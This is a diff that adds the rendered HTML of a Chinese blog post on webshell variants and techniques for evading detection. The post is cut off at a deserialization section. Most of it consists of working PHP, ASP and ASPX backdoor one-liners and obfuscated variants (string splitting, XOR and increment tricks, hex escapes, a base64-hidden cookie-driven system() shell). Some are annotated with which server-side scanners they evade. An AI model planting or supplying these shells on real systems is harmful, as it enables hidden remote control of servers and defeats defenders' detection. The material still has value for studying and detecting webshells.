@@ -1,31 +1,405 @@
-extends includes/layout.pug
+<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>关于Webshell的一些变种及初探免杀技术 | 可惜没如果、m0nk3y‘s Blog</title><meta name="keywords" content="webshell"><meta name="author" content="m0nk3y"><meta name="copyright" content="m0nk3y"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><meta name="description" content="本文中资料均来自互联网总结而成,仅供安全技术学习,侵删  什么是webshellweb的含义是需要服务器开放web服务，shell的含义是取得对服务器某种程度上操作权限。webshell常常被称为入侵者通过网站端口对网站服务器的某种程度上操作的权限。由于webshell其大多是以动态脚本的形式出现，也有人称之为网站的后门工具。 一般渗透测试的时候,能拿到shell 表示渗透成功了 推荐一">
+<meta property="og:type" content="article">
+<meta property="og:title" content="关于Webshell的一些变种及初探免杀技术">
+<meta property="og:url" content="https://hack-for.fun/c739.html">
+<meta property="og:site_name" content="可惜没如果、m0nk3y‘s Blog">
+<meta property="og:description" content="本文中资料均来自互联网总结而成,仅供安全技术学习,侵删  什么是webshellweb的含义是需要服务器开放web服务，shell的含义是取得对服务器某种程度上操作权限。webshell常常被称为入侵者通过网站端口对网站服务器的某种程度上操作的权限。由于webshell其大多是以动态脚本的形式出现，也有人称之为网站的后门工具。 一般渗透测试的时候,能拿到shell 表示渗透成功了 推荐一">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://hack-for.fun/null">
+<meta property="article:published_time" content="2020-02-26T16:00:00.000Z">
+<meta property="article:modified_time" content="2020-08-25T08:45:37.780Z">
+<meta property="article:author" content="m0nk3y">
+<meta property="article:tag" content="webshell">
+<meta property="article:tag" content="免杀">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://hack-for.fun/null"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://hack-for.fun/c739"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css"><script>var GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true},
+  copy: {
+    success: 'Copy successfully',
+    error: 'Copy error',
+    noSupport: 'The browser does not support'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: 'Just',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  ClickShowText: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  justifiedGallery: {
+    js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+    css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isanchor: false
+};
 
-block content
-  #post
-    if top_img === false
-      include includes/header/post-info.pug
+var saveToLocal = {
+  set: function setWithExpiry(key, value, ttl) {
+    const now = new Date()
+    const expiryDay = ttl * 86400000
+    const item = {
+      value: value,
+      expiry: now.getTime() + expiryDay,
+    }
+    localStorage.setItem(key, JSON.stringify(item))
+  },
 
-    article#article-container.post-content!=page.content
-    include includes/post/post-copyright.pug
-    .tag_share
-      if (theme.post_meta.post.tags)
-        .post-meta__tag-list
-          each item, index in page.tags.data
-            a(href=url_for(item.path)).post-meta__tags #[=item.name]
-      include includes/third-party/share/index.pug
-        
-    if theme.reward.enable
-      !=partial('includes/post/reward', {}, {cache:theme.fragment_cache})
+  get: function getWithExpiry(key) {
+    const itemStr = localStorage.getItem(key)
 
-    //- ad
-    if theme.ad && theme.ad.post
-      .post-ad!=theme.ad.post
+    if (!itemStr) {
+      return undefined
+    }
+    const item = JSON.parse(itemStr)
+    const now = new Date()
 
-    include includes/pagination.pug
-    if theme.related_post && theme.related_post.enable
-      != related_posts(page,site.posts)
+    if (now.getTime() > item.expiry) {
+      localStorage.removeItem(key)
+      return undefined
+    }
+    return item.value
+  }
+}</script><script id="config_change">var GLOBAL_CONFIG_SITE = { 
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2020-08-25 16:45:37'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
 
-    if page.comments !== false && theme.comments && theme.comments.use
-      - var commentsJsLoad = true
-      !=partial('includes/third-party/comments/index', {}, {cache:theme.fragment_cache})
-      
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(function () {  window.activateDarkMode = function () {
+    document.documentElement.setAttribute('data-theme', 'dark')
+    if (document.querySelector('meta[name="theme-color"]') !== null) {
+      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+    }
+  }
+  window.activateLightMode = function () {
+    document.documentElement.setAttribute('data-theme', 'light')
+   if (document.querySelector('meta[name="theme-color"]') !== null) {
+      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+    }
+  }
+  const autoChangeMode = 'false'
+  const t = saveToLocal.get('theme')
+  if (autoChangeMode === '1') {
+    const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
+    const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
+    const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
+    const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
+    if (t === undefined) {
+      if (isLightMode) activateLightMode()
+      else if (isDarkMode) activateDarkMode()
+      else if (isNotSpecified || hasNoSupport) {
+        const now = new Date()
+        const hour = now.getHours()
+        const isNight = hour <= 6 || hour >= 18
+        isNight ? activateDarkMode() : activateLightMode()
+      }
+      window.matchMedia('(prefers-color-scheme: dark)').addListener(function (e) {
+        if (saveToLocal.get('theme') === undefined) {
+          e.matches ? activateDarkMode() : activateLightMode()
+        }
+      })
+    } else if (t === 'light') activateLightMode()
+    else activateDarkMode()
+  } else if (autoChangeMode === '2') {
+    const now = new Date()
+    const hour = now.getHours()
+    const isNight = hour <= 6 || hour >= 18
+    if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
+    else if (t === 'light') activateLightMode()
+    else activateDarkMode()
+  } else {
+    if (t === 'dark') activateDarkMode()
+    else if (t === 'light') activateLightMode()
+  }const asideStatus = saveToLocal.get('aside-status')
+if (asideStatus !== undefined) {
+   if (asideStatus === 'hide') {
+     document.documentElement.classList.add('hide-aside')
+   } else {
+     document.documentElement.classList.remove('hide-aside')
+   }
+}})()</script><meta name="generator" content="Hexo 5.1.1"><link rel="alternate" href="/atom.xml" title="可惜没如果、m0nk3y‘s Blog" type="application/atom+xml">
+</head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="author-avatar"><img class="avatar-img" src="/null" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">97</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">Tags</div><div class="length-num">81</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">Categories</div><div class="length-num">22</div></a></div></div></div><hr/></div></div><div id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg)"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">可惜没如果、m0nk3y‘s Blog</a></span><span id="menus"><span class="close" id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></span></span></nav><div id="post-info"><h1 class="post-title">关于Webshell的一些变种及初探免杀技术</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2020-02-26T16:00:00.000Z" title="Created 2020-02-27 00:00:00">2020-02-27</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2020-08-25T08:45:37.780Z" title="Updated 2020-08-25 16:45:37">2020-08-25</time></span></div><div class="meta-secondline"> <span class="post-meta-separator">|</span><span class="post-meta-pv-cv"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><a id="more"></a>
+
+
+
+<blockquote>
+<p>本文中资料均来自互联网总结而成,仅供安全技术学习,侵删</p>
+</blockquote>
+<h1 id="什么是webshell"><a href="#什么是webshell" class="headerlink" title="什么是webshell"></a>什么是webshell</h1><p>web的含义是需要服务器开放web服务，shell的含义是取得对服务器某种程度上操作权限。webshell常常被称为入侵者通过网站端口对网站服务器的某种程度上操作的权限。由于webshell其大多是以动态脚本的形式出现，也有人称之为网站的后门工具。</p>
+<p>一般渗透测试的时候,能拿到shell 表示渗透成功了</p>
+<p>推荐一个 webshell 项目: </p>
+<p><a target="_blank" rel="noopener" href="https://github.com/tennc/webshell">https://github.com/tennc/webshell</a></p>
+<h1 id="webshell-分类"><a href="#webshell-分类" class="headerlink" title="webshell 分类"></a>webshell 分类</h1><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200227084939.png"></p>
+<h2 id="一句话木马"><a href="#一句话木马" class="headerlink" title="一句话木马"></a>一句话木马</h2><p>记得设置 shell 管理器(ck刀,菜刀,蚁剑的连接的类型为base64,不然有些马连不上)</p>
+<p>一句话木马根据后端语言的不同大致分为PHP一句话木马和ASP,JSP,ASPX一句话木马,但是原理都是一样的,利用了命令执行和数据传递</p>
+<p>如何进行数据传递?PHP的几个超全局变量,<code>$_GET[&quot;PASSWD&quot;] ,$_POST[&quot;PASSWD&quot;], $_COOKIE[&quot;PASSWD&quot;]</code> </p>
+<p>一句话木马接收我们传递的数据,并且当做PHP代码来执行</p>
+<p>一句话木马也就是经常利用的<code>&lt;?php @eval($_POST[&quot;PASSWD&quot;]);?&gt; </code> ,<code>eval()</code>函数会计算其中的表达式,如果其中是合法的PHP代码,那么就会执行其中的PHP代码,也是PHP中的危险函数之一.<code>PASSWD</code>也就是所谓的连接密码,<code>@</code>的作用是屏蔽报错信息,起到增强隐蔽性的效果.下面来看看PHP一句话木马的一些变种.</p>
+<blockquote>
+<p>注意: POST[AAA],POST[123] 都可以, POST里面不是必须使用单引号</p>
+</blockquote>
+<p>asp 一句话木马:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%execute(request(&quot;passwd&quot;))%&gt;</span><br></pre></td></tr></table></figure>
+
+<p>aspx 一句话木马:  </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ Page Language&#x3D;&quot;Jscript&quot;%&gt;</span><br><span class="line">&lt;%eval(Request.Item[&quot;passwd&quot;])%&gt;</span><br></pre></td></tr></table></figure>
+
+<p>首先,为什么会出现webshell 的变种…因为现在网站的防御都做的比较好,基于正则,基于特征的WAF,让上面那种形式的一句话肯定会被查杀(检测eval(),和$_POST)</p>
+<p>目前容易直接检测的执行代码函数有:<code>eval,assert,system,popen,shell_exec</code>等,因此为了逃过WAF的检测,就必须猥琐(如利用php动态函数执行)</p>
+<h3 id="一句话木马变形"><a href="#一句话木马变形" class="headerlink" title="一句话木马变形"></a>一句话木马变形</h3><h4 id="利用-GPC"><a href="#利用-GPC" class="headerlink" title="利用 $GPC"></a>利用 $GPC</h4><blockquote>
+<p><strong>利用 <code>$GLOBALS</code></strong> </p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>($GLOBALS[<span class="string">&#x27;_POST&#x27;</span>][<span class="string">&#x27;passwd&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>因为很多WAF 检查<code>$_POST</code>,所以用<code>$GLOBALS</code> 即可逃过查杀</p>
+<blockquote>
+<p><strong>利用 $_FILE</strong></p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>($_FILE[<span class="string">&#x27;name&#x27;</span>])<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="关键字替换"><a href="#关键字替换" class="headerlink" title="关键字替换"></a>关键字替换</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$k = <span class="string">&quot;ass&quot;</span>.<span class="string">&quot;ert&quot;</span>;$k($&#123;<span class="string">&quot;_PO&quot;</span>.<span class="string">&quot;ST&quot;</span>&#125;[<span class="string">&#x27;passwd&#x27;</span>]);</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200227202309.png"></p>
+<p>利用了PHP 的可变函数拆分<code>assert</code> ,但是这种太简单,一般会被检测</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 将 assert写入函数中</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">func</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;ass&quot;</span>.<span class="string">&quot;ert&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">$a = func(); <span class="comment">// 调用func()</span></span><br><span class="line">$a($&#123;<span class="string">&quot;_PO&quot;</span>.<span class="string">&quot;ST&quot;</span>&#125;[<span class="string">&#x27;passwd&#x27;</span>]);<span class="comment">// assert($_POST[&#x27;passwd&#x27;]);</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p><strong>空格替换&amp;字符串替换</strong></p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> $b=strrev(<span class="string">&quot;edoced_4&quot;</span>.<span class="string">&quot;6esab&quot;</span>);<span class="keyword">eval</span>($b(str_replace(<span class="string">&quot; &quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;a W Y o a X N z Z X Q o J F 9 D T 0 9 L S U V b J 2 N t J 1 0 p K X t v Y l 9 z d G F y d C g p O 3 N 5 c 3 R l b S h i Y X N l N j R f Z G V j b 2 R l K C R f Q 0 9 P S 0 l F W y d j b S d d K S 4 n I D I + J j E n K T t z Z X R j b 2 9 r a W U o J F 9 D T 0 9 L S U V b J 2 N u J 1 0 s J F 9 D T 0 9 L S U V b J 2 N w J 1 0 u Y m F z Z T Y 0 X 2 V u Y 2 9 k Z S h v Y l 9 n Z X R f Y 2 9 u d G V u d H M o K S k u J F 9 D T 0 9 L S U V b J 2 N w J 1 0 p O 2 9 i X 2 V u Z F 9 j b G V h b i g p O 3 0 = &quot;</span>)));<span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">// base64的部分内容为: </span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_COOKIE[<span class="string">&#x27;cm&#x27;</span>])) &#123;</span><br><span class="line">    ob_start();</span><br><span class="line">    system(base64_decode($_COOKIE[<span class="string">&#x27;cm&#x27;</span>]) . <span class="string">&#x27; 2&gt;&amp;1&#x27;</span>);</span><br><span class="line">    setcookie($_COOKIE[<span class="string">&#x27;cn&#x27;</span>], $_COOKIE[<span class="string">&#x27;cp&#x27;</span>] . base64_encode(ob_get_contents()) . $_COOKIE[<span class="string">&#x27;cp&#x27;</span>]);</span><br><span class="line">    ob_end_clean();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>先使用<code>strrev()</code>函数倒转base64_decode,然后用<code>str_replace()</code>将空格替换掉.这种方式采用的是将字符串继续各种变形达到隐藏敏感函数的目的,能够有效免杀</p>
+<h4 id="特殊字符"><a href="#特殊字符" class="headerlink" title="特殊字符"></a>特殊字符</h4><blockquote>
+<p><strong>进制运算</strong></p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">@$_++;</span><br><span class="line"></span><br><span class="line">$__=(<span class="string">&quot;#&quot;</span>^<span class="string">&quot;|&quot;</span>).(<span class="string">&quot;.&quot;</span>^<span class="string">&quot;~&quot;</span>).(<span class="string">&quot;/&quot;</span>^<span class="string">&quot;`&quot;</span>).(<span class="string">&quot;|&quot;</span>^<span class="string">&quot;/&quot;</span>).(<span class="string">&quot;&#123;&quot;</span>^<span class="string">&quot;/&quot;</span>);         <span class="comment">// $__的值为_POST</span></span><br><span class="line"></span><br><span class="line">@$&#123;$__&#125;[!$_]($&#123;$__&#125;[$_]);</span><br></pre></td></tr></table></figure>
+
+<p>通过异或运算<code>^</code> ,取反运算<code>!</code> 方式组成一个webshell</p>
+<blockquote>
+<p><strong>自增运算</strong></p>
+</blockquote>
+<p>因为在PHP中，<code>&#39;a&#39;++ =&gt; &#39;b&#39;</code>，<code>&#39;b&#39;++ =&gt; &#39;c&#39;</code>,所以我们如果得到了其中的一个字母，通过这个字符就可以得到所有的字母。通过<code>$_=[];$_=@&quot;$_&quot;;;</code>得到<code>$_</code>为<code>Array</code>的字符串，那么就可以得到所有的字符串了。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">$_=[];</span><br><span class="line">$_=@<span class="string">&quot;$_&quot;</span>; <span class="comment">// $_=&#x27;Array&#x27;;</span></span><br><span class="line">$_=$_[<span class="string">&#x27;!&#x27;</span>==<span class="string">&#x27;@&#x27;</span>]; <span class="comment">// $_=$_[0];</span></span><br><span class="line">$___=$_; <span class="comment">// A</span></span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;</span><br><span class="line">$___.=$__; <span class="comment">// S</span></span><br><span class="line">$___.=$__; <span class="comment">// S</span></span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++; <span class="comment">// E </span></span><br><span class="line">$___.=$__;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; <span class="comment">// R</span></span><br><span class="line">$___.=$__;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; <span class="comment">// T</span></span><br><span class="line">$___.=$__;</span><br><span class="line">$____=<span class="string">&#x27;_&#x27;</span>;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; <span class="comment">// P</span></span><br><span class="line">$____.=$__;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; <span class="comment">// O</span></span><br><span class="line">$____.=$__;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; <span class="comment">// S</span></span><br><span class="line">$____.=$__;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; <span class="comment">// T</span></span><br><span class="line">$____.=$__;</span><br><span class="line"></span><br><span class="line">$_=$$____;</span><br><span class="line">$___(base64_decode($_[_])); <span class="comment">// ASSERT($_POST[_]);</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p><strong>利用注释</strong></p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">@$_=<span class="string">&quot;s&quot;</span>.<span class="string">&quot;s&quot;</span>.<span class="comment">/*-/*-*/</span><span class="string">&quot;e&quot;</span>.<span class="comment">/*-/*-*/</span><span class="string">&quot;r&quot;</span>;</span><br><span class="line">@$_=<span class="comment">/*-/*-*/</span><span class="string">&quot;a&quot;</span>.<span class="comment">/*-/*-*/</span>$_.<span class="comment">/*-/*-*/</span><span class="string">&quot;t&quot;</span>;</span><br><span class="line">@$_<span class="comment">/*-/*-*/</span>($<span class="comment">/*-/*-*/</span>&#123;<span class="string">&quot;_P&quot;</span>.<span class="comment">/*-/*-*/</span><span class="string">&quot;OS&quot;</span>.<span class="comment">/*-/*-*/</span><span class="string">&quot;T&quot;</span>&#125;</span><br><span class="line">[<span class="comment">/*-/*-*/</span><span class="number">0</span><span class="comment">/*-/*-*/</span>-<span class="comment">/*-/*-*/</span><span class="number">2</span><span class="comment">/*-/*-*/</span>-<span class="comment">/*-/*-*/</span><span class="number">5</span><span class="comment">/*-/*-*/</span>]); <span class="comment">// 密码-7</span></span><br><span class="line"><span class="comment">// 我这里蚁剑连不上.... 因为PHP 7.1 assert 无法通过可变函数来执行了</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p><strong>异或运算和字符编码</strong></p>
+</blockquote>
+<p>这种异或运算得到的webshell与上面讲的通过异或运算不完全一样。在特定的编码情况下，一些字符串经过异或运算就能够得到一些特定的函数，这些函数就可以用于构造webshell。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$y=~督耽孩^<span class="string">&#x27;(1987)&#x27;</span>;</span><br><span class="line">$y($_POST[<span class="number">1987</span>]);</span><br><span class="line"><span class="comment">// 以GBK 的编码方式保存, $y为 assert</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$x=~Ÿ¬¬º«;</span><br><span class="line">$x($_POST[~¹¹ÏÏÏÏ]);</span><br><span class="line"><span class="comment">// 以 ISO-8859-15保存, $x为 assert, ~¹¹ÏÏÏÏ 为FF0000</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="利用函数变形"><a href="#利用函数变形" class="headerlink" title="利用函数变形"></a>利用函数变形</h4><p>对大量的webshell分析，发现很多的webshell其实都是<code>eval(base64_decode($_POST[cmd]))</code>这种方式的变形。变形的核心思想其实就是将<code>base64_decode</code>、<code>$_POST</code>,以及<code>strrev</code>反转隐藏。</p>
+<blockquote>
+<p><strong>字符串&amp;数组的方式</strong></p>
+</blockquote>
+<p>这种方法的webshell, 是通过先声明数组,然后从数组中的字符取值然后组合成敏感函数</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$sF = <span class="string">&quot;PCT4BA6ODSE_&quot;</span>;</span><br><span class="line">$s21 = strtolower($sF[<span class="number">4</span>] . $sF[<span class="number">5</span>] . $sF[<span class="number">9</span>] . $sF[<span class="number">10</span>] . $sF[<span class="number">6</span>] . $sF[<span class="number">3</span>] . $sF[<span class="number">11</span>] . $sF[<span class="number">8</span>] . $sF[<span class="number">10</span>] . $sF[<span class="number">1</span>] . $sF[<span class="number">7</span>] . $sF[<span class="number">8</span>] . $sF[<span class="number">10</span>]);</span><br><span class="line">$s22 = $&#123;strtoupper($sF[<span class="number">11</span>] . $sF[<span class="number">0</span>] . $sF[<span class="number">7</span>] . $sF[<span class="number">9</span>] . $sF[<span class="number">2</span>])&#125;[<span class="string">&#x27;passwd&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($s22)) &#123;</span><br><span class="line">    <span class="keyword">eval</span>($s21($s22));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>通过字符串<code>PCT4BA6ODSE_</code>得到,<code>$s21</code>为<code>base64_decode</code>,<code>$s22</code>为<code>$&#123;&quot;_POST&quot;&#125;[&#39;passwd&#39;]</code>,所以这种方式最后的代码其实就是<code>eval(base64_decode($_POST[&#39;passwd&#39;]));</code> </p>
+<blockquote>
+<p><strong>进制转换</strong></p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$v230c590=<span class="string">&quot;\x62\x61\163\x65\x36\x34\137\144\145\x63\x6f\144\145&quot;</span>;</span><br><span class="line">@<span class="keyword">eval</span>($v230c590(.....</span><br></pre></td></tr></table></figure>
+
+<p>其中<code>$v230c590</code>就是<code>base64_decode</code>，通过十六进制和八进制混用的方式代替<code>base64_decode</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$liner = <span class="string">&quot;pr&quot;</span>.<span class="string">&quot;e&quot;</span>.<span class="string">&quot;g_&quot;</span>.<span class="string">&quot;re&quot;</span>.<span class="string">&quot;p&quot;</span>.<span class="string">&quot;l&quot;</span>.<span class="string">&quot;ace&quot;</span>;</span><br><span class="line">$liner(<span class="string">&quot;/.*/e&quot;</span>,<span class="string">&quot;\x65\x76\x61\x6C\x28\x67\x7A\x75\x6E\x63\x6F\x6D\x70\x72\x65\x73\x73\x28\x62\x61\x73\x65\x36\x34\x5F\x64\x65\x63\x6F\x64\x65\x28&quot;</span>,php_code);</span><br></pre></td></tr></table></figure>
+
+<p>这段代码利用了<code>preg_replace()</code> 函数的<code>/e</code>模式来达到代码执行漏洞,将危险函数进过进制转换混淆</p>
+<p>其中<code>\x65\x76\x61\x6C\x28\x67\x7A\x75\x6E\x63\x6F\x6D\x70\x72\x65\x73\x73\x28\x62\x61\x73\x65\x36\x34\x5F\x64\x65\x63\x6F\x64\x65\x28</code>其实为<code>eval(gzuncompress(base64_decode(</code></p>
+<p>完整的一句话: </p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$liner = <span class="string">&quot;pr&quot;</span>.<span class="string">&quot;e&quot;</span>.<span class="string">&quot;g_&quot;</span>.<span class="string">&quot;re&quot;</span>.<span class="string">&quot;p&quot;</span>.<span class="string">&quot;l&quot;</span>.<span class="string">&quot;ace&quot;</span>;</span><br><span class="line">$liner(<span class="string">&quot;/.*/e&quot;</span>,<span class="string">&quot;\x65\x76\x61\x6C\x28\x67\x7A\x75\x6E\x63\x6F\x6D\x70\x72\x65\x73\x73\x28\x62\x61\x73\x65\x36\x34\x5F\x64\x65\x63\x6F\x64\x65\x28&quot;</span>,@<span class="keyword">eval</span>($_POST[<span class="string">&#x27;passwd&#x27;</span>]));</span><br><span class="line"><span class="meta">?&gt;</span> <span class="comment">// 连接密码为 passwd php5.6 蚁剑可连,但是被查杀(宝塔自带的查杀), D盾没过</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p><strong>反序列化代码执行</strong></p>
+</blockquote>
